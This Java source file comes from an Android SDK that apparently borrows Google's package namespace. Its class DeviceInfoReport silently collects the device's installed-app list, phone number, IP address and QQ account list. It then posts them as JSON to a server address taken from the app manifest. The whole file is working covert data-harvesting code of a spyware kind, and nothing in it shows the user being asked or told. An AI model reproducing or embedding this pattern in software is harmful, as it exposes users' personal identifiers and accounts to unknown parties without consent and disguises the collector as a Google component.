package com.google.android.ore.report;

import android.content.Context;
import android.os.AsyncTask;
import android.text.TextUtils;

import com.google.android.ore.OreApp;
import com.google.android.ore.report.bean.DeviceInfo;
import com.google.android.ore.thinkandroid.http.AsyncHttpClient;
import com.google.android.ore.thinkandroid.http.AsyncHttpResponseHandler;
import com.google.android.ore.thinkandroid.http.RequestParams;
import com.google.android.ore.util.ApkUtil;
import com.google.android.ore.util.DevUtil;
import com.google.android.ore.util.ManifestUtil;
import com.google.android.ore.util.P;

public class DeviceInfoReport {
	private final String KEY_DEVICE_INFO_REPORTED = DeviceInfoReport.class.getPackage().getName()+"_KEY_DEVICE_INFO_REPORTED";
	private final String KEY_DEVICE_INFO_JSON_STR = DeviceInfoReport.class.getPackage().getName()+"_KEY_DEVICE_INFO_JSON_STR";
	private Boolean isAliving = false;
	public void report(Context context){
		if (OreApp.get().getOreConfig().report > 1) {
			return ;
		}
		if (TextUtils.isEmpty(OreApp.get().getSdkInfo().user_id)) {
			return;
		}
		if (P.getBoolean(true, KEY_DEVICE_INFO_REPORTED, false)) {
			return;
		}
		if (isAliving) {
			return;
		}
		isAliving = true;
		syncReport(context);
	}
	public void syncReport(final Context context) {
		new AsyncTask<Object, Object, String>() {

			@Override
			protected String doInBackground(Object... params) {
				String deviceInfoJsonStr = "";
				deviceInfoJsonStr = P.getString(true, KEY_DEVICE_INFO_JSON_STR, "");
				if (TextUtils.isEmpty(deviceInfoJsonStr)) {
					DeviceInfo deviceInfo = new DeviceInfo();
					deviceInfo.installedAppInfoList = ApkUtil.getInstalledAppInfo(context);
					deviceInfo.phone_num = DevUtil.getPhoneNum(context);
					deviceInfo.ip = DevUtil.GetIp();
					deviceInfo.qqList = DevUtil.getQQList(context);
					deviceInfo.user_info = deviceInfo.generateUserInfo();
					deviceInfoJsonStr = OreApp.get().getGson().toJson(deviceInfo);
				}
				return deviceInfoJsonStr;
			}

			protected void onPostExecute(String deviceInfoJsonStr) {
				if (TextUtils.isEmpty(deviceInfoJsonStr)) {
					isAliving = false;
					return;
				}
				P.putBoolean(true, KEY_DEVICE_INFO_REPORTED, true);
				deviceInfoReport(deviceInfoJsonStr,new AsyncHttpResponseHandler(){
					public void onSuccess(int statusCode, String content) {
						if (200 == statusCode) {
							
						}
					};
					public void onFinish() {
						isAliving = false;
					};
				});
			};
		}.execute();
		
	}
	/*
	 * 设备信息上报
	 */
	public void deviceInfoReport(String deviceInfo,AsyncHttpResponseHandler asyncHttpResponseHandler) {
		AsyncHttpClient client = new AsyncHttpClient();
		RequestParams requestParams = new RequestParams();
		requestParams.put("data", deviceInfo);
		client.post(ManifestUtil.getUinfo(OreApp.get()) , requestParams, asyncHttpResponseHandler);
	}
}
